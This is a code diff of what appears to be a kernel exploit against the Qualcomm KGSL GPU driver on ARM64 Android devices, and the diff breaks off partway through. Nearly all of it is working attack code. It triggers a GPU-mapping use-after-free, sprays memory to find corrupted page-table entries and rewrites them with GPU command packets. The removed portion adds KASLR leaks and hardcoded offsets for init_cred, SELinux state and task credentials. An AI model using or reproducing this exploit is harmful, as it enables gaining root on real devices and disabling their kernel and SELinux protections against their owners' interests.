@@ -1,826 +1,2479 @@
-
-
+#define _GNU_SOURCE
+#include <errno.h>
+#include <fcntl.h>
+#include <inttypes.h>
+#include <pthread.h>
+#include <sched.h>
+#include <signal.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <stdint.h>
-#include <stdbool.h>
-#include <fcntl.h>
-#include <unistd.h>
-#include <errno.h>
-#include <pthread.h>
 #include <sys/ioctl.h>
 #include <sys/mman.h>
-#include <sched.h>
-#include <sys/prctl.h>
-#include <signal.h>
-#include <sys/syscall.h>
-#include <linux/perf_event.h>
-#include <asm/unistd.h>
-#include <sys/wait.h>
-#include <signal.h>
-#include <sys/select.h>
-#include <poll.h>
 #include <sys/stat.h>
-
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <sys/wait.h>
+#include <time.h>
+#include <unistd.h>
+#include <sys/prctl.h>
+#include <sys/syscall.h>
+#define MARKER_NAME "KETO0422"  // name
+#define MAX_FOUND_PAGES 1
+#define SECOND_CHILD_START 0x900
+#define FOUND_PID 0x300
+#define SET_TASKS 0x200
+#define SEND_ADDR 3
+#define GOT_ADDR 4
+#define CALL_LOGLINE 0xff0
+#define CUR_PID 0xfa0
+#define MMAP_CORRUPT_CNT 0x9f8
+#define EX_OVER 0xffc
+#define TASK_SPRAY_CLEAR 0x901
+#define TARGET_PIDPID 0x40
+char * gbuf;
+int fd;
+int fd2;
+int fd_lib;
+int fd_shellcode;
+struct stat st;
+char check_flag[100]={0,};
+unsigned long long gb_target_addr;
+uint64_t selinux_enforcing;
+static void flush_icache(void *addr, size_t len)
+{
+    __builtin___clear_cache((char *)addr, (char *)addr + len);
+    __sync_synchronize();
+}
+uint8_t sig_num[] = {1,3,5,7,9};
+// KGSL UAPI
 #define KGSL_IOC_TYPE 0x09
+#define FINDING 1
+#define SPRAY_COUNT 4000
+#define SPRAY_COUNT_STEP 2000
+#define SPRAY_COUNT_MAX 20000
+#define KGSL_MEMFLAGS_USE_CPU_MAP 0x10000000ULL
+#define KGSL_USER_MEM_TYPE_ADDR   0x00000002U
+typedef struct {
+    pid_t pid;
+    int   do_action;
+} spray_slot_t;
 
+static spray_slot_t *spray_ctrl;  
+static int spray_count = SPRAY_COUNT;
 struct kgsl_gpuobj_alloc {
-    uint64_t size; uint64_t flags; uint64_t va_len;
-    uint64_t mmapsize; unsigned int id;
-    unsigned int metadata_len; uint64_t metadata;
+    uint64_t size;
+    uint64_t flags;
+    uint64_t va_len;
+    uint64_t mmapsize;          // OUT
+    unsigned int id;            // OUT
+    unsigned int metadata_len;
+    uint64_t metadata;
 };
+
+struct kgsl_gpuobj_free {
+    uint64_t flags;
+    uint64_t priv;
+    unsigned int id;
+    unsigned int type;
+    unsigned int len;
+};
+
+struct kgsl_map_user_mem {
+    int fd;
+    unsigned long gpuaddr;
+    size_t len;
+    size_t offset;
+    unsigned long hostptr;
+    unsigned int memtype;
+    unsigned int flags;
+};
+
 #define IOCTL_KGSL_GPUOBJ_ALLOC _IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)
+#define IOCTL_KGSL_GPUOBJ_FREE  _IOW(KGSL_IOC_TYPE, 0x46, struct kgsl_gpuobj_free)
+#define IOCTL_KGSL_MAP_USER_MEM _IOWR(KGSL_IOC_TYPE, 0x15, struct kgsl_map_user_mem)
 
-struct kgsl_gpuobj_free { uint64_t flags; uint64_t priv; unsigned int id; unsigned int type; unsigned int len; unsigned int __pad; };
-#define IOCTL_KGSL_GPUOBJ_FREE _IOW(KGSL_IOC_TYPE, 0x46, struct kgsl_gpuobj_free)
+#define DEV_PATH "/dev/kgsl-3d0"
+#define PAGE_SIZE 4096
 
-struct kgsl_gpuobj_info { uint64_t gpuaddr, flags, size, va_len, va_addr; unsigned int id; };
-#define IOCTL_KGSL_GPUOBJ_INFO _IOWR(KGSL_IOC_TYPE, 0x47, struct kgsl_gpuobj_info)
+#define UAF_START      0x00000007001ff000ULL
+#define UAF_SIZE       0x0000000010004000ULL
 
-struct kgsl_gpuobj_import { uint64_t priv; uint64_t priv_len; uint64_t flags; unsigned int type; unsigned int id; };
-#define IOCTL_KGSL_GPUOBJ_IMPORT _IOWR(KGSL_IOC_TYPE, 0x48, struct kgsl_gpuobj_import)
+#define OVERLAP_START  0x00000007001fe000ULL
+#define OVERLAP_SIZE   0x0000000000007000ULL
 
-struct kgsl_gpuobj_import_useraddr { uint64_t virtaddr; };
+#define PLACEH_START   0x0000000710204000ULL
+#define PLACEH_SIZE    0x0000000000010000ULL
 
-struct kgsl_drawctxt_create { unsigned int flags; unsigned int drawctxt_id; };
-#define IOCTL_KGSL_DRAWCTXT_CREATE _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)
+#define BOGUS_START    0x0000000700204000ULL
+#define WRAP_SIZE      0xffffffffffefd000ULL
 
-struct kgsl_command_object { uint64_t offset; uint64_t gpuaddr; uint64_t size; unsigned int flags; unsigned int id; };
+typedef struct {
+    int fd;
+    volatile int ready;
+    volatile int bogus_started;
+    volatile int result;
+    volatile int saved_errno;  
+} race_state_t;
+
+
+#define CP_NOP        0x10
+#define CP_MEM_WRITE  0x3D
+#define CP_MEM_TO_MEM 0x73
+
+#define KGSL_CONTEXT_NO_GMEM_ALLOC 0x00000002
+#define KGSL_CONTEXT_PREAMBLE      0x00000010
+#define KGSL_CMDLIST_IB            0x00000001U
+#define KGSL_TIMESTAMP_RETIRED     0x00000002
+
+struct kgsl_drawctxt_create { 
+    unsigned flags, drawctxt_id; 
+};
+
+struct kgsl_command_object { 
+    uint64_t offset, gpuaddr, size; 
+    unsigned flags, id; 
+};
 
 struct kgsl_gpu_command {
-    uint64_t flags; uint64_t cmdlist; unsigned int cmdsize, numcmds;
-    uint64_t objlist; unsigned int objsize, numobjs;
-    uint64_t synclist; unsigned int syncsize, numsyncs;
-    unsigned int context_id, timestamp;
+    uint64_t flags, cmdlist; 
+    unsigned cmdsize, numcmds; 
+    uint64_t objlist; 
+    unsigned objsize, numobjs;
+    uint64_t synclist; 
+    unsigned syncsize, numsyncs, context_id, timestamp;
 };
-#define IOCTL_KGSL_GPU_COMMAND _IOWR(KGSL_IOC_TYPE, 0x4A, struct kgsl_gpu_command)
 
-struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, timestamp; };
-#define IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID _IOWR(KGSL_IOC_TYPE, 0x16, struct kgsl_cmdstream_readtimestamp_ctxtid)
+struct kgsl_cmdstream_readtimestamp_ctxtid { 
+    unsigned context_id, type, timestamp; 
+};
 
-#define KGSL_MEMFLAGS_USE_CPU_MAP (1ULL << 28)
-#define KGSL_CACHEMODE_SHIFT 0
-#define KGSL_CACHEMODE_MASK 3
-#define KGSL_CACHEMODE_UNCACHED 0
-#define KGSL_CACHEMODE_WRITECOMBINE 1
-#define KGSL_CACHEMODE_WRITETHROUGH 2
-#define KGSL_CACHEMODE_WRITEBACK 3
-#define KGSL_USER_MEM_TYPE_ADDR 2
-#define KGSL_CONTEXT_PREAMBLE 0x00000010
-#define KGSL_CONTEXT_NO_GMEM_ALLOC 0x00000002
-#define KGSL_CMDLIST_IB 0x00000001U
-#define KGSL_TIMESTAMP_RETIRED 0x00000002
+struct kgsl_gpuobj_info { 
+    uint64_t gpuaddr, flags, size, va_len, va_addr; 
+    unsigned id; 
+};
 
-// 地址配置（适应 4.14 用户空间布局）
-#define UAF_ADDR  0x7001ff000ULL
-#define UAF_SIZE  0x10004000ULL          // 16MB+16KB
-#define OVERLAP_ADDR 0x7001fe000ULL
-#define OVERLAP_SIZE 0x7000ULL
-#define BOGUS_ADDR 0x700204000ULL
-#define BOGUS_SIZE 0xffffffffffefd000ULL
-#define PLACEHOLDER_ADDR 0x710204000ULL   // UAF終端直後
-#define PLACEHOLDER_SIZE 0x10400000ULL    // 16MB+256KB
+#define IOCTL_KGSL_DRAWCTXT_CREATE _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)
+#define IOCTL_KGSL_GPUOBJ_INFO     _IOWR(KGSL_IOC_TYPE, 0x47, struct kgsl_gpuobj_info)
+#define IOCTL_KGSL_GPU_COMMAND     _IOWR(KGSL_IOC_TYPE, 0x4A, struct kgsl_gpu_command)
+#define IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID \
+    _IOWR(KGSL_IOC_TYPE, 0x16, struct kgsl_cmdstream_readtimestamp_ctxtid)
 
-// 4.14 内核常见符号预偏移（基于 MSM 4.14 通用基址，最终由 KASLR 检测修正）
-#define VMLINUX_TEXT      0xffffffc010080000ULL   // 4.14 常见 _text
-#define VMLINUX_INIT_CRED 0xffffffc011e4b800ULL   // 需从实际内核提取，此处为占位
-#define VMLINUX_SELINUX_STATE 0xffffffc0123a4000ULL
-#define VMLINUX_SELINUX_ENFORCING_BOOT 0xffffffc01240744cULL
-
-// task_struct 偏移（4.14 ARM64 典型值，扫描逻辑可自适应）
-#define CRED_OFF    0x748          // 4.14 中 cred 偏移可能为 0x748
-#define REAL_CRED_OFF 0x740        // 实际可能相同
-#define COMM_OFF    0x818          // comm 偏移在 4.14 中仍为 0x818
-
-#define SPRAY_PIDS 2000
-#define SCAN_DWORDS 560  // 覆盖至 0x8BF (comm 0x818, cred 0x748)
-
-static int kgsl_fd = -1;
-static volatile int race_done = 0;
-static volatile int dc_civac_works = -1; /* -1=untested, 0=no, 1=yes */
-
-static void sigill_handler(int sig) { dc_civac_works = 0; }
-
-static void try_dc_civac(void *addr) {
-    if (dc_civac_works == 0) return;
-    void *old = signal(SIGILL, sigill_handler);
-    __sync_synchronize();
-    asm volatile("dc civac, %0" : : "r"(addr) : "memory");
-    asm volatile("dsb sy" : : : "memory");
-    __sync_synchronize();
-    signal(SIGILL, old);
-    if (dc_civac_works == -1) dc_civac_works = 1;
+static inline uint32_t pm4_calc_odd_parity_bit(uint32_t val)
+{
+    return (0x9669u >> (0xFu & (val ^ (val >> 4) ^ (val >> 8) ^ (val >> 12) ^
+                                (val >> 16) ^ (val >> 20) ^ (val >> 24) ^ (val >> 28)))) & 1u;
 }
+#define MMAP_SPRAY_COUNT 12000
+#define MMAP_SPRAY_STRIDE 0x200000ULL
+#define MMAP_SPRAY_BASE 0x0000000200000000ULL
 
-static void flush_dc_civac_range(void *start, size_t len) {
-    if (dc_civac_works != 1) return;
-    char *p = (char*)((uintptr_t)start & ~63);
-    char *end = (char*)((uintptr_t)start + len);
-    for (; p < end; p += 64) try_dc_civac(p);
-}
+#define PAGE_SHIFT     12
+#define PAGE_MASK      (~(PAGE_SIZE - 1))
+#define PMD_SHIFT      21
+#define PGDIR_SHIFT    30
+#define PTRS_PER_PTE   512
+#define PTRS_PER_PMD   512
+#define PTRS_PER_PGD   512
+#define PHYS_MASK      ((1ULL << 48) - 1)   // 48-bit PA 
 
-static void die(const char *msg) { perror(msg); exit(1); }
+typedef struct { uint64_t pgd; } pgd_t;
+typedef struct { uint64_t pmd; } pmd_t;
+typedef struct { uint64_t pte; } pte_t;
 
-static long perf_open(struct perf_event_attr *attr, pid_t pid, int cpu, int group_fd, unsigned long flags) {
-    return syscall(__NR_perf_event_open, attr, pid, cpu, group_fd, flags);
-}
+struct mm_struct {
+    struct vm_area_struct *mmap;
+    pgd_t *pgd;
+};
 
-// 改进的 KASLR 检测：先尝试 perf，若失败则从 /proc/kallsyms 读取 init_cred 地址
-static uint64_t detect_kaslr(void) {
-    struct perf_event_attr pe = {0};
-    pe.type = PERF_TYPE_HARDWARE;
-    pe.size = sizeof(pe);
-    pe.config = PERF_COUNT_HW_CPU_CYCLES;
-    pe.sample_type = PERF_SAMPLE_IP;
-    pe.sample_period = 100;
-    pe.disabled = 1;
-    pe.exclude_kernel = 0; pe.exclude_hv = 1; pe.exclude_user = 1;
+#define pgd_index(addr) (((addr) >> PGDIR_SHIFT) & (PTRS_PER_PGD - 1))
+#define pmd_index(addr) (((addr) >> PMD_SHIFT) & (PTRS_PER_PMD - 1))
+#define pte_index(addr) (((addr) >> PAGE_SHIFT) & (PTRS_PER_PTE - 1))
 
-    int fd = perf_open(&pe, 0, -1, -1, 0);
-    if (fd < 0) { printf("  perf_open: errno=%d\n", errno); goto fallback; }
+#define pgd_val(x) ((x).pgd)
+#define pmd_val(x) ((x).pmd)
+#define pte_val(x) ((x).pte)
 
-    int npages = 256;
-    size_t mmap_size = (1 + npages) * 4096;
-    void *buf = mmap(NULL, mmap_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
-    if (buf == MAP_FAILED) { close(fd); goto fallback; }
+#define PTE_SAVE_BASE 0xf00
 
-    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
-    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
-    usleep(500000);
-    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
 
-    struct perf_event_mmap_page *pmp = (struct perf_event_mmap_page *)buf;
-    uint64_t head = pmp->data_head;
-    uint64_t tail = pmp->data_tail;
+static int wait_timestamp(int fd, unsigned ctx_id, unsigned target);
+static inline uint32_t cp_type7_packet(uint32_t opcode, uint32_t cnt);
+static inline void split64(uint64_t addr, uint32_t *lo, uint32_t *hi);
 
-    uint8_t *data = (uint8_t *)buf + pmp->data_offset;
-    uint64_t data_size = pmp->data_size;
+static void recover_origin(int fd){
+    /* recover corrupted PTE. named "PTE0", "PTE1" were weired but I'm too lazy  */
+    uint64_t patched_va[64] = {0};
+    uint64_t saved_pte0[64] = {0};
+    size_t patched_cnt = 0;
+    uint32_t rb_count = *(uint32_t *)(gbuf + 0xb00);
+    for (uint32_t i = 0; i < rb_count && patched_cnt < sizeof(patched_va)/sizeof(patched_va[0]); i++) {
+        patched_va[patched_cnt] = *(uint64_t *)(gbuf + 0xb08 + i * 24);
+        saved_pte0[patched_cnt] = *(uint64_t *)(gbuf + PTE_SAVE_BASE + i * 8);
+        patched_cnt++;
+    }
 
-    uint64_t first_kernel_ip = 0;
-    int n_ips = 0;
+    struct kgsl_drawctxt_create ctx = {
+        .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC
+    };
+    if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx) != 0) {
+        perror("recover_origin: ctx create");
+        return;
+    }
+    unsigned ctx_id = ctx.drawctxt_id;
 
-    while (tail < head) {
-        uint64_t idx = tail & (data_size - 1);
-        struct perf_event_header *hdr = (struct perf_event_header *)(data + idx);
-        if (hdr->type == PERF_RECORD_SAMPLE && (hdr->misc & PERF_RECORD_MISC_KERNEL)) {
-            n_ips++;
-            uint64_t ip = *(uint64_t *)(hdr + 1);
-            if (first_kernel_ip == 0) first_kernel_ip = ip;
-            if (n_ips <= 3) printf("    IP[%d]=0x%lX\n", n_ips, (unsigned long)ip);
+    struct kgsl_gpuobj_alloc ib_alloc = {
+        .size  = PAGE_SIZE * 2,
+        .flags = KGSL_MEMFLAGS_USE_CPU_MAP
+    };
+    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &ib_alloc) != 0) {
+        perror("recover_origin: ib alloc");
+        return;
+    }
+    unsigned ib_id = ib_alloc.id;
+    void *ib_vma = mmap(NULL, ib_alloc.mmapsize, PROT_READ | PROT_WRITE,
+                        MAP_SHARED, fd, ((off_t)ib_id) << 12);
+    if (ib_vma == MAP_FAILED) {
+        perror("recover_origin: ib mmap");
+        struct kgsl_gpuobj_free fr = {0};
+        fr.id = ib_id;
+        ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
+        return;
+    }
+
+    struct kgsl_gpuobj_info info = { .id = ib_id };
+    ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
+    uint64_t ib_gpu = info.gpuaddr;
+
+    struct kgsl_gpuobj_alloc dst_alloc = {
+        .size  = PAGE_SIZE,
+        .flags = KGSL_MEMFLAGS_USE_CPU_MAP
+    };
+    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &dst_alloc) != 0) {
+        perror("recover_origin: dst alloc");
+        munmap(ib_vma, ib_alloc.mmapsize);
+        struct kgsl_gpuobj_free fr = {0};
+        fr.id = ib_id;
+        ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
+        return;
+    }
+    unsigned dst_id = dst_alloc.id;
+    void *dst_vma = mmap(NULL, dst_alloc.mmapsize, PROT_READ | PROT_WRITE,
+                         MAP_SHARED, fd, ((off_t)dst_id) << 12);
+    if (dst_vma == MAP_FAILED) {
+        perror("recover_origin: dst mmap");
+        munmap(ib_vma, ib_alloc.mmapsize);
+        struct kgsl_gpuobj_free fr = {0};
+        fr.id = ib_id;
+        ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
+        fr.id = dst_id;
+        ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
+        return;
+    }
+    struct kgsl_gpuobj_info dst_info = { .id = dst_id };
+    ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &dst_info);
+    uint64_t dst_gpu = dst_info.gpuaddr;
+
+    for (size_t i = 0; i < patched_cnt; i++) {
+        uint64_t base = patched_va[i];
+        if (!base) {
+            fprintf(stderr,
+                    "recover_origin: empty VA entry at index %zu\n",
+                    i);
+            continue;
         }
-        tail += hdr->size;
-    }
+        uint64_t orig_pte0 = saved_pte0[i];
+        if (!orig_pte0) {
+            fprintf(stderr,
+                    "recover_origin: no saved PTE0 for VA 0x%llx\n",
+                    (unsigned long long)base);
+            continue;
+        }
 
-    munmap(buf, mmap_size); close(fd);
-    printf("    kernel_samples=%d\n", n_ips);
+        uint32_t *cmd = (uint32_t *)ib_vma;
 
-    if (n_ips > 0) {
-        uint64_t kaslr = (first_kernel_ip - VMLINUX_TEXT) & ~0x1FFFFFULL;
-        uint64_t ic_addr = VMLINUX_INIT_CRED + kaslr;
-        printf("    first_kernel_ip=0x%lX kaslr=0x%lX init_cred=0x%lX\n",
-            (unsigned long)first_kernel_ip, (unsigned long)kaslr, (unsigned long)ic_addr);
-        return ic_addr;
-    }
+        memset(ib_vma, 0, ib_alloc.mmapsize);
+        int dw = 0;
+        uint32_t d_lo, d_hi, s_lo, s_hi;
+        cmd[dw++] = cp_type7_packet(CP_NOP, 0);
+        split64(dst_gpu, &d_lo, &d_hi);
+        split64(base + 0x8, &s_lo, &s_hi);
+        cmd[dw++] = cp_type7_packet(CP_MEM_TO_MEM, 5);
+        cmd[dw++] = 0;
+        cmd[dw++] = d_lo;
+        cmd[dw++] = d_hi;
+        cmd[dw++] = s_lo;
+        cmd[dw++] = s_hi;
+        cmd[dw++] = cp_type7_packet(CP_NOP, 0);
 
-fallback:
-    // 尝试从 /proc/kallsyms 读取 init_cred 地址
-    printf("  Fallback: reading init_cred from /proc/kallsyms\n");
-    FILE *fp = fopen("/proc/kallsyms", "r");
-    if (!fp) return 0;
-    char line[256];
-    uint64_t init_cred = 0;
-    while (fgets(line, sizeof(line), fp)) {
-        if (strstr(line, " init_cred")) {
-            sscanf(line, "%lx", &init_cred);
-            break;
+        size_t bytes = (size_t)dw * 4;
+        msync(ib_vma, bytes, MS_SYNC);
+
+        struct kgsl_command_object obj = {
+            .gpuaddr = ib_gpu,
+            .size    = bytes,
+            .flags   = KGSL_CMDLIST_IB,
+            .id      = ib_id
+        };
+
+        struct kgsl_gpu_command c = {0};
+        c.cmdlist    = (uint64_t)(uintptr_t)&obj;
+        c.cmdsize    = sizeof(obj);
+        c.numcmds    = 1;
+        c.context_id = ctx_id;
+
+        uint64_t pte1 = 0;
+        if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &c) != 0 ||
+            wait_timestamp(fd, ctx_id, c.timestamp) != 0) {
+            fprintf(stderr,
+                    "recover_origin: PTE1 read failed for VA 0x%llx\n",
+                    (unsigned long long)base);
+            continue;
+        } else {
+            msync(dst_vma, 8, MS_SYNC | MS_INVALIDATE);
+            pte1 = *(uint64_t *)dst_vma;
+        }
+
+        memset(ib_vma, 0, ib_alloc.mmapsize);
+        dw = 0;
+
+        cmd[dw++] = cp_type7_packet(CP_NOP, 0);
+
+        split64(base+8, &d_lo, &d_hi);
+        cmd[dw++] = cp_type7_packet(CP_MEM_WRITE, 3);
+        cmd[dw++] = d_lo;
+        cmd[dw++] = d_hi;
+        cmd[dw++] = (uint32_t)(orig_pte0 & 0xffffffffu);
+
+        split64(base + 12, &d_lo, &d_hi);
+        cmd[dw++] = cp_type7_packet(CP_MEM_WRITE, 3);
+        cmd[dw++] = d_lo;
+        cmd[dw++] = d_hi;
+        cmd[dw++] = (uint32_t)(orig_pte0 >> 32);
+
+        cmd[dw++] = cp_type7_packet(CP_NOP, 0);
+
+        bytes = (size_t)dw * 4;
+        msync(ib_vma, bytes, MS_SYNC);
+
+        obj.size = bytes;
+        memset(&c, 0, sizeof(c));
+        c.cmdlist    = (uint64_t)(uintptr_t)&obj;
+        c.cmdsize    = sizeof(obj);
+        c.numcmds    = 1;
+        c.context_id = ctx_id;
+
+        if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &c) != 0 ||
+            wait_timestamp(fd, ctx_id, c.timestamp) != 0) {
+            fprintf(stderr,
+                    "recover_origin: GPU restore failed for VA 0x%llx\n",
+                    (unsigned long long)base);
+        } else {
+            fprintf(stderr,
+                    "recover_origin: restored PTE0 at VA 0x%llx (PTE1=0x%016llx, PTE0=0x%016llx)\n",
+                    (unsigned long long)base,
+                    (unsigned long long)pte1,
+                    (unsigned long long)orig_pte0);
         }
     }
-    fclose(fp);
-    if (init_cred) printf("  init_cred=0x%lX (from kallsyms)\n", init_cred);
-    return init_cred;
+
+    munmap(ib_vma, ib_alloc.mmapsize);
+    struct kgsl_gpuobj_free fr = {0};
+    fr.id = ib_id;
+    ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
+    munmap(dst_vma, dst_alloc.mmapsize);
+    struct kgsl_gpuobj_free fr_dst = {0};
+    fr_dst.id = dst_id;
+    ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr_dst);
 }
 
-static int gpuobj_alloc(int fd, uint64_t size, uint64_t flags) {
-    struct kgsl_gpuobj_alloc a = { .size = size, .flags = flags };
-    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a) < 0) die("gpuobj_alloc");
-    return a.id;
+
+static inline uint32_t cp_type7_packet(uint32_t opcode, uint32_t cnt)
+{
+    return (7u << 28)
+         | ((cnt & 0x3FFFu) << 0)
+         | (pm4_calc_odd_parity_bit(cnt) << 15)
+         | ((opcode & 0x7Fu) << 16)
+         | (pm4_calc_odd_parity_bit(opcode) << 23);
 }
 
-static void *gpuobj_mmap(int fd, size_t size, unsigned int id) {
-    void *p = mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, (off_t)id << 12);
-    if (p == MAP_FAILED) die("gpuobj_mmap");
-    return p;
+static inline void split64(uint64_t addr, uint32_t *lo, uint32_t *hi)
+{ 
+    *lo = (uint32_t)addr; 
+    *hi = (uint32_t)(addr >> 32); 
 }
 
-static int gpuobj_info(int fd, unsigned int id, uint64_t *gpuaddr, uint64_t *flags) {
-    struct kgsl_gpuobj_info inf = { .id = id };
-    int ret = ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &inf);
-    if (ret == 0) {
-        if (gpuaddr) *gpuaddr = inf.gpuaddr;
-        if (flags) *flags = inf.flags;
-    }
-    return ret;
+static int mmap_spray_done;
+static void mmap_spray(void)
+{
+    
+	fprintf(stderr, "\n[13] mmap-spraying user VA space\n");
+	mmap_spray_done = 0;
+	for (int i = 0; i < MMAP_SPRAY_COUNT; i++) {
+		uint8_t *addr = (uint8_t *)(MMAP_SPRAY_BASE + i * MMAP_SPRAY_STRIDE);
+		void *p;
+        for(int j = 0 ; j < 5; j++){
+            p = mmap(addr + PAGE_SIZE * (uint64_t)sig_num[j] , PAGE_SIZE,
+		         PROT_READ | PROT_WRITE,
+		         MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
+		         -1, 0);
+            *(volatile uint8_t *)p = sig_num[j];                 
+		    if ((uint64_t)p != (uint64_t)addr + PAGE_SIZE * (uint64_t)sig_num[j]) { fprintf(stderr,"mmap_spray"); break; }
+            
+        }
+		
+		
+		mmap_spray_done++;
+	}
 }
 
-static void gpuobj_free(int fd, unsigned int id) {
-    struct kgsl_gpuobj_free f = { .id = id };
-    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &f) < 0) die("gpuobj_free");
+
+
+
+static void mmap_spray_free(void)
+{
+	for (int i = 0; i < MMAP_SPRAY_COUNT; i++) {
+		uint8_t *addr = (uint8_t *)(MMAP_SPRAY_BASE + i * MMAP_SPRAY_STRIDE);
+        if (1){
+            for(int j=0;j<5;j++){
+                munmap(addr + PAGE_SIZE * (uint64_t)sig_num[j],0x1000);
+            }
+        }
+        else {
+            fprintf(stderr,"\nfind that addr\n");
+        }
+	}
+}
+static void mmap_check(void)
+{
+    uint64_t * check_addr = (uint64_t *)&gbuf[0xa00];
+    int cnt = 0;
+    uint32_t *corrupt_cnt = (uint32_t *)(gbuf + MMAP_CORRUPT_CNT);
+	fprintf(stderr, "\n[14] mmap-checking user VA space\n");
+	*corrupt_cnt = 0;
+    for (int i = 0; i < MMAP_SPRAY_COUNT; i++) {
+		uint8_t *addr = (uint8_t *)(MMAP_SPRAY_BASE + i * MMAP_SPRAY_STRIDE);
+        uint8_t * pp =addr + PAGE_SIZE * (uint64_t)sig_num[0];
+		if (*(volatile uint8_t *)pp != sig_num[0]){ // PFN write success
+            fprintf(stderr,"PFN corrupted!!\n");
+            gb_target_addr = (uint64_t)addr;
+            // No need to pad the hole..
+            for (int k = 0; k < 10; k += 2) { 
+                void *hole_addr = (void *)(addr + k * PAGE_SIZE);
+                
+                void *filled = mmap(hole_addr, PAGE_SIZE, 
+                                    PROT_READ | PROT_WRITE, 
+                                    MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 
+                                    -1, 0);
+                                    
+                if (filled != MAP_FAILED) {
+                    *(volatile uint8_t *)filled = 0xCC; 
+                }
+                else{
+                    fprintf(stderr, "abc %d\n",k);
+                }
+            }
+            for (int k = 10; k < 16; k += 1) { 
+                void *hole_addr = (void *)(addr + k * PAGE_SIZE);
+                
+                
+                void *filled = mmap(hole_addr, PAGE_SIZE, 
+                                    PROT_READ | PROT_WRITE, 
+                                    MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 
+                                    -1, 0);
+                                    
+                if (filled != MAP_FAILED) {
+                    *(volatile uint8_t *)filled = 0xCC; 
+                }
+                else{
+                    fprintf(stderr, "1234!@#$ %d\n",k);
+                }
+            }
+            
+
+            void *base = (void *)(addr + 0x10 * PAGE_SIZE); // pte offset = 0x130
+            size_t len = 0x3e000;
+
+            void *lib = mmap(base, len,
+                 PROT_READ | PROT_EXEC,
+                 MAP_PRIVATE | MAP_FIXED | MAP_POPULATE,
+                 fd_lib, 0);
+
+
+
+            if (lib == MAP_FAILED) {
+                fprintf(stderr, "mmap libbase error");
+                perror("mmap libbase");
+                
+                exit(1);
+            } else 
+            {
+
+                fprintf(stderr, "success mmap libbase : va: %p\n", lib);
+
+                volatile uint8_t *p = (volatile uint8_t *)lib;
+                for (size_t off = 0; off < 0x3e000; off += PAGE_SIZE) {
+                    volatile uint8_t dummy = p[off]; // touch
+                    (void)dummy; // prevent opt
+                }
+                *(uint64_t *)&gbuf[0x400] = (uint64_t)lib;
+            }
+        }
+
+        else {
+            //munmap(addr,2*PAGE_SIZE); junk
+        }
+	}
+	//*corrupt_cnt = cnt;
 }
 
-static unsigned int create_context(int fd) {
-    struct kgsl_drawctxt_create c = { .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC };
-    if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &c) < 0) die("create_context");
-    return c.drawctxt_id;
-}
 
-static int wait_timestamp(int fd, unsigned int ctx_id, unsigned int target) {
-    struct kgsl_cmdstream_readtimestamp_ctxtid r = { .context_id = ctx_id, .type = KGSL_TIMESTAMP_RETIRED };
-    for (int i = 0; i < 100000; i++) {
-        if (ioctl(fd, IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID, &r) != 0) return -1;
-        if (r.timestamp >= target) return 0;
-        usleep(100);
+static int wait_timestamp(int fd, unsigned ctx_id, unsigned target)
+{
+    struct kgsl_cmdstream_readtimestamp_ctxtid r = {0};
+    r.context_id = ctx_id; 
+    r.type = KGSL_TIMESTAMP_RETIRED;
+    
+    for (unsigned spins=0; spins<100000; ++spins) {
+        if (ioctl(fd, IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID, &r) != 0) 
+            return -1;
+        if (r.timestamp >= target) 
+            return 0;
+        usleep(100); // from 150
     }
     return -2;
 }
 
-static uint32_t pm4_parity(uint32_t v) {
-    return (0x9669 >> (0xF & (v ^ (v>>4) ^ (v>>8) ^ (v>>12) ^ (v>>16) ^ (v>>20) ^ (v>>24) ^ (v>>28)))) & 1;
-}
+struct nonzero_page {
+    uint64_t va;
+    uint32_t data[1024];
+    int non_zero_count;
+};
 
-static uint32_t cp_type7(uint32_t opcode, uint32_t cnt) {
-    return (7<<28) | (cnt&0x3FFF) | (pm4_parity(cnt)<<15) | ((opcode&0x7F)<<16) | (pm4_parity(opcode)<<23);
-}
-#define CP_NOP 0x10
-#define CP_MEM_WRITE 0x3D
-#define CP_MEM_TO_MEM 0x73
-#define CP_WAIT_MEM_WRITES 0x12
-#define CP_EVENT_WRITE 0x46
-#define CACHE_FLUSH_TS 0x1C
 
-static void split64(uint64_t addr, uint32_t *lo, uint32_t *hi) {
